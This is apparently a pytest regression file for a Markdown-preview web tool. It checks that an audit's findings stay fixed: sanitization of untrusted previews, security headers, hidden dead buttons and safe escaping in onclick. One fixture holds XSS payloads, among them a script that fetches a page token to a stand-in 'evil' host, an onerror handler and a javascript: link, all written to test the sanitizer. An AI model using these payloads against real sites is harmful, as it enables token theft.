"""監査で確定した Web 層 finding（XSS・ヘッダ・ボタンガード）の再現・回帰テスト。"""

from pathlib import Path

import pytest

pytest.importorskip("fastapi")
pytest.importorskip("markdown")
from fastapi.testclient import TestClient  # noqa: E402

from docsweep.config import load_config  # noqa: E402
from docsweep.server.app import create_app  # noqa: E402

TOKEN = "test-token-xyz"


def _client(root: Path):
    cfg = load_config(explicit_roots=[str(root)], global_path=root / "no.yaml")
    return TestClient(create_app(cfg, token=TOKEN))


# ---- [01][02][25]: 信頼できない .md のプレビューがサニタイズされる ----

def test_preview_sanitizes_untrusted_markdown(tmp_path: Path):
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    (root / "proj" / "plan_evil.md").write_text(
        "# [計画] わな\n\n安全本文マーカー\n\n"
        '<script>fetch("//evil/"+document.body.dataset.token)</script>\n'
        '<img src=x onerror="alert(1)">\n'
        "[クリック](javascript:alert(2))\n",
        encoding="utf-8",
    )
    c = _client(root)
    p = (root / "proj" / "plan_evil.md").resolve().as_posix()
    r = c.get("/preview", params={"token": TOKEN, "path": p})
    assert r.status_code == 200
    body = r.text.lower()
    assert "安全本文マーカー" in r.text     # 正規の本文は描画される
    assert "<script" not in body            # script 除去
    assert "onerror" not in body            # イベントハンドラ除去
    assert "javascript:" not in body        # 危険スキーム除去


# ---- F-B/[40]: 防御ヘッダ（Referer 漏れ・MIME スニッフィング対策）----

def test_security_headers_present(tmp_path: Path):
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    (root / "proj" / "plan_x.md").write_text("# [計画] x\n\n## 概要\n\nx\n", encoding="utf-8")
    c = _client(root)
    r = c.get(f"/?token={TOKEN}")
    assert r.headers.get("referrer-policy") == "no-referrer"
    assert r.headers.get("x-content-type-options") == "nosniff"


# ---- [21][22]: needs_fix カードに 400 確定のボタン/属性を出さない ----

def test_needs_fix_card_has_no_dead_buttons(tmp_path: Path):
    root = tmp_path / "dev"
    (root / "proj").mkdir(parents=True)
    # 未知ラベル → parse_error → needs_fix（state=None, allowed_actions=['keep']）。
    (root / "proj" / "plan_broken.md").write_text("# [ナニコレ] こわれた\n", encoding="utf-8")
    c = _client(root)
    html = c.get(f"/?token={TOKEN}").text
    assert "plan_broken.md" in html       # カード自体は出る
    assert "relabel" not in html          # 保留(relabel)ボタンは出ない
    assert "data-arch" not in html        # 一括 archive 対象にもならない


# ---- [11][13]: パスにシングルクオートを含んでも onclick が壊れない（tojson）----

def test_apostrophe_path_renders_safe_onclick(tmp_path: Path):
    root = tmp_path / "dev"
    d = root / "bob's-proj"
    d.mkdir(parents=True)
    (d / "plan_stale.md").write_text("# [計画] x\n\n## 概要\n\nx\n", encoding="utf-8")
    import os
    import time
    old = time.time() - 200 * 86400
    os.utime(d / "plan_stale.md", (old, old))
    c = _client(root)
    html = c.get(f"/?token={TOKEN}").text
    # tojson はシングルクオートを ' にエスケープし、生の ...bob's... を onclick に出さない。
    assert "bob\\u0027s-proj" in html
